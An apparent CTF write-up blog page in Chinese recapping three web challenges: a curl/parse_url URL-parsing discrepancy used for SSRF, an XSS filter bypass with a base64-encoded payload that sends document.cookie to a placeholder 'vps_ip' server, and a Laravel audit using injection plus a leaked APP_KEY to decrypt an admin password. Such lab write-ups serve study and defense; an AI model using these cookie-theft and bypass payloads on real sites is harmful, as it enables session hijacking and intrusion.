@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>近期比赛题目复现 | Iuhrey的幻想乡</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言整个寒假都在学习挖洞相关的知识，ctf方面的投入比之前少了许多，近期比赛优秀的题目也比较多，所以写了这篇复现来记录一些新知识 php trick得到flag需要满足多个条件，前面多个条件都是ctf常见的，这里就不多叙述了，这题最主要的一个绕过点如下: 先审计代码，第九步要求parse_url()解析url的域名要为百度的域名，第十步则是限制了协议要为http，所有限制过后，网站会对我们输入的u">
+<meta name="keywords" content="比赛总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="近期比赛题目复现">
+<meta property="og:url" content="http://yoursite.com/2019/02/25/近期比赛题目复现/index.html">
+<meta property="og:site_name" content="Iuhrey的幻想乡">
+<meta property="og:description" content="前言整个寒假都在学习挖洞相关的知识，ctf方面的投入比之前少了许多，近期比赛优秀的题目也比较多，所以写了这篇复现来记录一些新知识 php trick得到flag需要满足多个条件，前面多个条件都是ctf常见的，这里就不多叙述了，这题最主要的一个绕过点如下: 先审计代码，第九步要求parse_url()解析url的域名要为百度的域名，第十步则是限制了协议要为http，所有限制过后，网站会对我们输入的u">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/23/1.png">
+<meta property="og:image" content="http://yoursite.com/images/23/2.png">
+<meta property="og:image" content="http://yoursite.com/images/23/3.png">
+<meta property="og:image" content="http://yoursite.com/images/23/4.png">
+<meta property="og:image" content="http://yoursite.com/images/23/5.png">
+<meta property="og:updated_time" content="2019-02-26T17:36:57.228Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="近期比赛题目复现">
+<meta name="twitter:description" content="前言整个寒假都在学习挖洞相关的知识，ctf方面的投入比之前少了许多，近期比赛优秀的题目也比较多，所以写了这篇复现来记录一些新知识 php trick得到flag需要满足多个条件，前面多个条件都是ctf常见的，这里就不多叙述了，这题最主要的一个绕过点如下: 先审计代码，第九步要求parse_url()解析url的域名要为百度的域名，第十步则是限制了协议要为http，所有限制过后，网站会对我们输入的u">
+<meta name="twitter:image" content="http://yoursite.com/images/23/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="source/images/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>29</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>3</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>13</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-近期比赛题目复现" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/02/25/近期比赛题目复现/" class="article-date">
+  <time class="post-time" datetime="2019-02-25T10:54:47.000Z" itemprop="datePublished">
+    <span class="post-month">2月</span><br>
+    <span class="post-day">25</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      近期比赛题目复现
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整个寒假都在学习挖洞相关的知识，ctf方面的投入比之前少了许多，近期比赛优秀的题目也比较多，所以写了这篇复现来记录一些新知识</p>
+<h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><p>得到flag需要满足多个条件，前面多个条件都是ctf常见的，这里就不多叙述了，这题最主要的一个绕过点如下:</p>
+<p><img src="/images/23/1.png" alt=""><br>先审计代码，第九步要求parse_url()解析url的域名要为百度的域名，第十步则是限制了协议要为http，所有限制过后，网站会对我们输入的url进行访问，后面明显看出可以利用ssrf读取admin.php，所以现在的矛盾在于如何使得curl解析的域名是本地的域名同时绕过第九步的限制。<br>这里就需要理解curl和parse_url对url域名解析的差异性了。在如下这个url中:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test@1.com@2.com</span><br></pre></td></tr></table></figure></p>
+<p>curl解析的域名为1.com，而parse_url却是解析为2.com，还有类似的函数也是这样解析，如图:<br><img src="/images/23/2.png" alt=""><br>构造如上payload就能绕过了。</p>
+<h2 id="HappyXss"><a href="#HappyXss" class="headerlink" title="HappyXss"></a>HappyXss</h2><p>这题目比较上一题，把script，href，onerror等等关键字都过滤了，而且无法加载远程src资源。<br>这里学到了一种新的思路，在前端中eval()函数并没有被过滤，因此我们可以利用它把我们传入的代码转换成xss的payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(atob(base64后的代码));   //eval(atob(&quot;YWxlcnQoMSk=&quot;));</span><br><span class="line">eval(String.fromCharCode(ascii码));    //eval(String.fromCharCode(97,108,101,114,116,40,49,41));</span><br></pre></td></tr></table></figure></p>
+<p>我们只需要让它带上cookie访问我们的服务器即可，因此payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href=&quot;http://vps_ip/&quot;+document.cookie</span><br></pre></td></tr></table></figure></p>
+<p>注意的是””被过滤了，可以选择使用’’，最终payload如下，监听端口查看cookie就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=javascript:eval(atob(&apos;d2luZG93LmxvY2F0aW9uLmhyZWY9Imh0dHA6Ly92cHNfaXAvIitkb2N1bWVudC5jb29raWU=&apos;)); autofocus&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="HappyPHP"><a href="#HappyPHP" class="headerlink" title="HappyPHP"></a>HappyPHP</h2><p>这题目主要考察代码审计，登入界面有个提示可以拿到源码。<br>题目框架为laravel，根据大师傅的wp，学到了分析源码的基本步骤。<br>首先从路由开始，也就是/routes/web.app，可以分析出该网站有多少个页面，分别是什么功能。<br>接着从第一条开始，逐条追踪，查看详细代码的构成，一步一步审计直到找到可利用点。必要时可以使用全局搜索找我们所要的关键信息。<br>分析如何利用，构造payload，达到所要的目的。<br>在SessionsController.php发现可利用的点:<br><img src="/images/23/3.png" alt=""><br>这里代码可以进行注入，并且它会把结果返回给我们。联想到题目提示，flag在admin下，我们可以想到利用注入把email和password给注入出来。可以在/database/factories/UserFactory.php看到列的参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email:admin@hgame.com</span><br><span class="line">password:eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==</span><br></pre></td></tr></table></figure></p>
+<p>对password进行base64解码得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;iv&quot;:&quot;rnVrqfCvfJgnvSTi9z7KLw==&quot;,&quot;value&quot;:&quot;EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=&quot;,&quot;mac&quot;:&quot;56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>继续通过全局搜索key，cipher来找到加密方式，发现在app.php中:<br><img src="/images/23/4.png" alt=""><br>全局搜索APP_KEY并没有搜索到，发现.env文件并不存在，所以回溯到github项目上找到被删除的.env文件:<br><img src="/images/23/5.png" alt=""><br>找到了我们所要的APP_KEY:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$key=&quot;9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>结合上面的iv值和value值就可以解密被加密前的密码，登入即可拿到flag。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/02/25/近期比赛题目复现/" data-id="cjsk8gf1e001o5cvjmnn2uqan" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛总结/">比赛总结</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/11/28/NCTF-Web-wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">NCTF Web wp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+  <div id="comments" class="comments">
+    <div id="uyan_frame"></div>
+  </div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2158764"></script>
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Iuhrey的幻想乡</h1>
+    <h2 class="blog-subtitle">记录日常所学</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>29</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>3</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>13</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
+          喜欢啥几把BB的狗骑驴
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
+          喜欢gay在狗骑驴旁边的狗逼
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
+          gay里gay气的大黄
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
+          郁离歌大手子的博客
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
+          有很多小姐姐的烧包包
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2018 - 2019 Iuhrey<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
+      
+    </div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
